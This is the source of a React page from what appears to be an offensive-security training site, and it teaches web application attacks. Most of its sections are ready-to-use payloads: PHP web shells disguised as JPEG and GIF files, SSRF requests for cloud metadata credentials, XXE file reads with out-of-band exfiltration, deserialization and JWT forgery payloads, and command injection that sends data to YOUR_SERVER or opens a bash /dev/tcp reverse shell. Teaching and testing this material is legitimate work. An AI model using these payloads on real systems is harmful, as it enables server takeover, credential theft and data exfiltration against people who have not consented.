'use client'
import React from 'react'
import Link from 'next/link'

const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: '#00d4ff', marginTop: '3rem', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '10px' }}>
    <span style={{ color: '#003a4a', fontSize: '0.8rem' }}>//</span> {children}
  </h2>
)
const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', fontWeight: 600, color: '#0099bb', marginTop: '2rem', marginBottom: '0.75rem' }}>▸ {children}</h3>
)
const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#8a9a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>
)
const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#050810', border: '1px solid #003a4a', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: '#00d4ff', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const Alert = ({ type, children }: { type: 'info' | 'warn' | 'tip'; children: React.ReactNode }) => {
  const c: Record<string, [string, string, string]> = {
    info:  ['#00d4ff', 'rgba(0,212,255,0.05)', 'NOTE'],
    warn:  ['#ffb347', 'rgba(255,179,71,0.05)', 'WARNING'],
    tip:   ['#00ff41', 'rgba(0,255,65,0.04)',  'PRO TIP'],
  }
  const [color, bg, label] = c[type]
  return (
    <div style={{ background: bg, borderLeft: `3px solid ${color}`, padding: '1rem 1.25rem', borderRadius: '0 4px 4px 0', margin: '1.5rem 0', border: `1px solid ${color}33`, borderLeftColor: color }}>
      <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color, letterSpacing: '0.2em', marginBottom: '6px' }}>{label}</div>
      <div style={{ color: '#8a9a8a', fontSize: '0.85rem', lineHeight: 1.7 }}>{children}</div>
    </div>
  )
}
const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
  <div style={{ overflowX: 'auto', margin: '1rem 0 1.5rem' }}>
    <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
      <thead><tr style={{ borderBottom: '1px solid #003a4a' }}>{headers.map((h, i) => <th key={i} style={{ textAlign: 'left', padding: '8px 12px', color: '#0099bb', fontWeight: 600, fontSize: '0.7rem' }}>{h}</th>)}</tr></thead>
      <tbody>{rows.map((row, i) => <tr key={i} style={{ borderBottom: '1px solid #001a22', background: i % 2 === 0 ? 'transparent' : 'rgba(0,212,255,0.015)' }}>{row.map((cell, j) => <td key={j} style={{ padding: '8px 12px', color: '#8a9a8a', verticalAlign: 'top' }}>{cell}</td>)}</tr>)}</tbody>
    </table>
  </div>
)

export default function WebAttacksModule() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a5a' }}>
        <Link href="/" style={{ color: '#5a7a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span>
        <span style={{ color: '#00d4ff' }}>WEB APPLICATION ATTACKS</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: 'rgba(0,212,255,0.08)', border: '1px solid rgba(0,212,255,0.3)', borderRadius: '3px', color: '#00d4ff', fontSize: '8px' }}>CONCEPT</span>
          <Link href="/modules/web-attacks/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'transparent', border: '1px solid #1a2e1e', borderRadius: '3px', color: '#5a7a5a', fontSize: '8px' }}>LAB →</Link>
        </div>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>ADVANCED MODULE · CONCEPT PAGE</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: '#00d4ff', margin: '0.5rem 0', textShadow: '0 0 20px rgba(0,212,255,0.35)' }}>WEB APPLICATION ATTACKS</h1>
        <p style={{ color: '#5a7a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', lineHeight: 1.6 }}>Full OWASP exploitation · Burp Suite mastery · File upload attacks · SSRF · XXE · Deserialization · JWT attacks · GraphQL</p>
      </div>

      <H2>01 — File Upload Vulnerabilities</H2>
      <P>File upload functionality is one of the most critical attack surfaces in web applications. If an attacker can upload a file that gets executed by the server, it's Remote Code Execution. Even if not executed, uploaded files can enable other attacks.</P>

      <H3>Bypass Techniques</H3>
      <Pre label="// FILE UPLOAD BYPASS HIERARCHY">{`# Layer 1: Client-side validation (JavaScript)
# Bypass: disable JS, intercept in Burp, rename after selection
# This is the weakest protection — always bypassable

# Layer 2: Extension blacklisting
# Target: blocks .php, .asp, .aspx
# Bypass techniques:
#   Double extension:     shell.php.jpg
#   Alternative PHP:      shell.php5, shell.php7, shell.phtml, shell.pht
#   Case variation:       shell.PHP, shell.PhP
#   Null byte (old):      shell.php%00.jpg
#   Special chars:        shell.php;.jpg, shell.php:.jpg (Windows)

# Layer 3: Content-Type validation
# Bypass: change Content-Type header in Burp to image/jpeg
# while keeping PHP content in the file body

# Layer 4: Magic bytes check
# PHP + image header trick:
echo -e '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.jpg
# File appears to be JPEG but contains PHP code

# Layer 5: Image processing
# GIF with PHP payload:
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# ImageMagick exploit (CVE-2016-3714 — ImageTragick):
# Malicious MVG file that executes commands when processed

# Find the upload path:
# Check: /uploads/, /images/, /files/, /media/
# Response after upload often reveals path
# Combine with directory enumeration`}</Pre>

      <Pre label="// BURP SUITE — FILE UPLOAD TESTING WORKFLOW">{`# 1. Upload a legitimate image first
# 2. Capture the request in Burp Proxy
# 3. Send to Repeater

# Modify the request:
# Change filename: image.jpg → shell.php
# Change Content-Type: image/jpeg → application/x-php  (or keep as image/jpeg)
# Replace file content with: <?php system($_GET["cmd"]); ?>

# If blocked by extension:
# Try: shell.php5, shell.phtml, shell.php7

# If blocked by content-type:
# Keep Content-Type as image/jpeg but change file content to PHP

# If blocked by magic bytes:
# Add GIF89a; to start of PHP payload

# After successful upload, find the file:
# Response usually shows path
# Or: gobuster on /uploads/ directory

# Execute: http://target/uploads/shell.php?cmd=id`}</Pre>

      <H2>02 — Server-Side Request Forgery (SSRF)</H2>
      <P>SSRF occurs when a server can be tricked into making HTTP requests to arbitrary URLs. This allows attackers to reach internal services that are not accessible from the internet, access cloud metadata APIs, and in some cases achieve RCE.</P>

      <Pre label="// SSRF — DETECTION AND EXPLOITATION">{`# Basic SSRF test — does the server fetch URLs?
# Look for parameters like: url=, src=, href=, dest=, redirect=, uri=, path=

# Test with external URL (use Burp Collaborator or interactserver.io):
url=http://YOUR_BURP_COLLABORATOR.com

# If you get a DNS lookup → SSRF confirmed

# Internal network scanning via SSRF:
url=http://127.0.0.1                    # loopback
url=http://localhost                    # same
url=http://192.168.1.1                  # common gateway
url=http://10.0.0.1                     # private range

# Port scanning via SSRF:
url=http://127.0.0.1:22                 # SSH
url=http://127.0.0.1:3306               # MySQL
url=http://127.0.0.1:6379               # Redis
url=http://127.0.0.1:9200               # Elasticsearch
url=http://127.0.0.1:27017              # MongoDB

# Cloud metadata APIs — CRITICAL:
# AWS:
url=http://169.254.169.254/latest/meta-data/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns: AccessKeyId, SecretAccessKey, Token → full AWS access

# GCP:
url=http://metadata.google.internal/computeMetadata/v1/
url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure:
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01

# SSRF bypass techniques:
url=http://[::1]                        # IPv6 loopback
url=http://0x7f000001                   # hex IP (127.0.0.1)
url=http://2130706433                   # decimal IP (127.0.0.1)
url=http://127.0.0.1.nip.io            # DNS rebinding`}</Pre>

      <H2>03 — XML External Entity (XXE)</H2>
      <Pre label="// XXE INJECTION — READ INTERNAL FILES">{`# XXE occurs when XML input is parsed with external entities enabled
# Find: any endpoint that accepts XML (or DOCX/XLSX/SVG which are XML)

# Basic XXE — read /etc/passwd:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
  <data>&xxe;</data>
</root>

# XXE to SSRF — reach internal services:
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1:80/"> ]>
<root><data>&xxe;</data></root>

# Blind XXE — exfiltrate data out-of-band:
# When output is not reflected, use OOB technique
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR_SERVER/evil.dtd">
  %dtd;
]>
<root/>

# evil.dtd hosted on your server:
# <!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR_SERVER/?data=%file;'>">
# %all;
# &send;

# XXE via file upload (SVG):
# Upload an SVG file containing XXE payload
# Many image processors parse SVG as XML

# XXE in DOCX/XLSX:
# These are ZIP archives containing XML
# Modify word/document.xml to include XXE
# Re-zip and upload`}</Pre>

      <H2>04 — Insecure Deserialization</H2>
      <Pre label="// DESERIALIZATION ATTACKS">{`# Serialization = converting object to storable/transmittable format
# Deserialization = reconstructing object from stored data
# DANGER: if deserialized data is attacker-controlled → code execution

# PHP Object Injection:
# Vulnerable code: $data = unserialize($_COOKIE['user']);
# Create malicious object:
# O:8:"UserData":2:{s:4:"name";s:4:"test";s:4:"file";s:11:"/etc/passwd";}

# Java Deserialization (ysoserial):
# Most impactful — affects many Java frameworks
git clone https://github.com/frohoff/ysoserial
java -jar ysoserial.jar CommonsCollections5 "id" | base64

# Test for Java deserialization:
# Look for: rO0AB (base64) or 0xACED0005 (hex) in cookies/parameters
# These are Java serialized object magic bytes

# .NET deserialization:
# Look for JSON.NET, BinaryFormatter, DataContractSerializer
# Tools: ysoserial.net → https://github.com/pwntester/ysoserial.net

# Python pickle:
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(Exploit())

# Node.js (node-serialize):
# {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}`}</Pre>

      <H2>05 — JWT Attacks</H2>
      <Pre label="// JSON WEB TOKEN VULNERABILITIES">{`# JWT structure: header.payload.signature (base64 encoded, dot separated)
# Decode any JWT: jwt.io

# Attack 1: None algorithm
# Change algorithm to "none" → signature not verified
# Original header (decoded): {"alg":"HS256","typ":"JWT"}
# Modified header (encoded): {"alg":"none","typ":"JWT"}
# Remove signature entirely: header.payload.
python3 -c "
import base64, json
header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload_data = {'user':'admin','role':'admin'}
payload = base64.b64encode(json.dumps(payload_data).encode()).decode().rstrip('=')
print(f'{header}.{payload}.')
"

# Attack 2: HS256 with RS256 public key confusion
# If server uses RS256, expose public key, then sign as HS256
# Server may verify HS256 signature using the public key as HMAC secret

# Attack 3: Brute force weak secret
# Install jwt-cracker or use hashcat:
hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt

# JWT Tool (comprehensive testing):
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py TOKEN -T  # tamper with token
python3 jwt_tool.py TOKEN -C -d wordlist.txt  # crack
python3 jwt_tool.py TOKEN -X a  # test all attacks

# Attack 4: kid injection (key ID parameter)
# If kid parameter used to load key:
# kid: "../../dev/null" → empty key → sign with empty secret
# kid: "| ls -la" → command injection in some frameworks`}</Pre>

      <H2>06 — Command Injection</H2>
      <Pre label="// OS COMMAND INJECTION">{`# Occurs when user input is passed to OS shell command
# Vulnerable code: system("ping " + user_input)

# Basic injection characters:
;   # command separator (Linux)
|   # pipe
||  # OR (second runs if first fails)
&&  # AND (second runs if first succeeds)
&   # background (both run)
\`command\`  # backtick substitution
$(command)  # dollar substitution

# Test payloads:
; id
| id
& id
$(id)
\`id\`
; sleep 5        # time-based blind confirmation
| sleep 5

# URL-encoded versions:
%3B%20id          # ; id
%7C%20id          # | id
%26%26%20id       # && id

# Exfiltrate output in blind injection:
; curl http://YOUR_SERVER/$(whoami)
; wget "http://YOUR_SERVER/$(id | base64)"

# Get a reverse shell:
; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

# Bypass filters (space blocked):
;{ls,-la}          # IFS bypass
;cat</etc/passwd   # space bypass
;IFS=,;cat,/etc/passwd`}</Pre>

      <H2>07 — IDOR & Broken Access Control</H2>
      <Pre label="// INSECURE DIRECT OBJECT REFERENCE">{`# IDOR = accessing resources by manipulating object references
# #1 on OWASP Top 10 — most common critical vulnerability

# Test methodology:
# 1. Create two accounts (user A and user B)
# 2. As user A: perform actions that reference IDs
#    GET /api/user/123/profile
#    GET /api/orders/456
#    GET /api/documents/789.pdf
# 3. As user B: access user A's resources using their IDs
#    GET /api/user/123/profile  → should return 403, not user A's data

# Common IDOR locations:
# URL parameters:      /profile?id=123
# Path parameters:     /users/123/settings
# JSON body:           {"user_id": 123}
# Headers:             X-User-ID: 123
# Cookies:             user_id=123

# IDOR in file downloads:
# GET /download?file=report_user123.pdf
# Try: report_user124.pdf, report_admin.pdf, ../../etc/passwd

# Mass assignment (related):
# API accepts extra fields that shouldn't be settable
# POST /api/user/update
# {"name": "test", "role": "admin", "email": "test@test.com"}
# If "role" is accepted → privilege escalation

# Testing with Burp Suite Intruder:
# Capture request with ID parameter
# Send to Intruder → mark ID as payload
# Payload: Numbers 1-200
# Look for: 200 responses vs 403/404
# Different response sizes = different data returned = IDOR`}</Pre>

      <H2>08 — GraphQL Attacks</H2>
      <Pre label="// GRAPHQL SECURITY TESTING">{`# GraphQL is an API query language — increasingly common
# Key difference from REST: single endpoint, client defines shape of data

# Introspection query — enumerate the entire schema:
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# If introspection is disabled, try field suggestions:
{ user { unknownField } }
# Error often reveals: "Did you mean 'password'?"

# Find all available queries/mutations:
{__schema{queryType{fields{name description}}}}
{__schema{mutationType{fields{name description}}}}

# Batch query attack (bypass rate limiting):
[
  {"query": "{user(id:1){email}}"},
  {"query": "{user(id:2){email}}"},
  {"query": "{user(id:3){email}}"}
]
# 1000 queries in 1 request = rate limit bypass

# GraphQL injection (SQLi through GraphQL):
{user(id: "1 OR 1=1"){ email }}

# Tools:
# GraphQL Voyager: visualise schema
# Altair GraphQL Client: query builder
# InQL (Burp extension): comprehensive GraphQL testing`}</Pre>

      <H2>09 — HTTP Request Smuggling</H2>
      <Pre label="// HTTP REQUEST SMUGGLING">{`# Exploits disagreement between front-end and back-end servers
# about where HTTP request bodies end
# CVE of the decade — affects virtually all major web infrastructure

# Two headers control body length:
# Content-Length: exact byte count
# Transfer-Encoding: chunked (ends at 0\r\n\r\n)

# CL.TE attack (front-end uses CL, back-end uses TE):
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL attack (front-end uses TE, back-end uses CL):
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0

# Detection — time delay:
# If the smuggled prefix causes a delay → vulnerable

# Impact:
# Bypass front-end security controls
# Poison back-end request queue
# Capture other users' requests (steal session tokens)
# Redirect users to attacker-controlled content

# Tool: smuggler.py
git clone https://github.com/defparam/smuggler
python3 smuggler.py -u https://target.com -t 10`}</Pre>

      <H2>10 — Web Cache Poisoning</H2>
      <Pre label="// WEB CACHE POISONING">{`# Web caches store responses keyed to URL + certain headers
# If a cache key excludes a header that affects the response:
# → Attacker can poison cache with malicious response for all users

# Find unkeyed headers:
# X-Forwarded-Host: evil.com
# X-Forwarded-For: 127.0.0.1
# X-Original-URL: /admin
# X-Forwarded-Port: 1337

# Test if header affects response:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# If response includes evil.com → header is reflected but unkeyed
# Cache that response → all users get it

# Exploit: inject XSS via cache poisoning
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com"><script>alert(1)</script>

# Cache buster — force fresh cache entry:
GET /?cachebuster=RANDOM HTTP/1.1

# Tool: Web Cache Vulnerability Scanner (wcvs)
go install github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest
wcvs -u https://target.com`}</Pre>

      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: '1px solid #1a2e1e' }}>
        <div style={{ background: 'rgba(0,212,255,0.04)', border: '1px solid rgba(0,212,255,0.2)', borderRadius: '8px', padding: '2rem', textAlign: 'center', marginBottom: '1.5rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#1a4a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>READY TO PRACTICE?</div>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', color: '#00d4ff', marginBottom: '0.5rem', fontWeight: 600 }}>MOD-06 Interactive Lab</div>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a', marginBottom: '1.5rem' }}>5 steps &middot; 120 XP &middot; Real commands &middot; Flag captures</div>
          <Link href="/modules/web-attacks/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', color: '#00d4ff', padding: '12px 32px', border: '1px solid rgba(0,212,255,0.6)', borderRadius: '6px', background: 'rgba(0,212,255,0.1)', fontWeight: 700, letterSpacing: '0.12em', boxShadow: '0 0 20px rgba(0,212,255,0.15)', display: 'inline-block' }}>
            LAUNCH LAB &#8594;
          </Link>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between' }}>
          <Link href="/modules/active-directory" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a6a3a' }}>&#8592; MOD-05: ACTIVE DIRECTORY</Link>
          <Link href="/modules/malware" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a6a3a' }}>MOD-07: MALWARE &#8594;</Link>
        </div>
      </div>
    </div>
  )
}
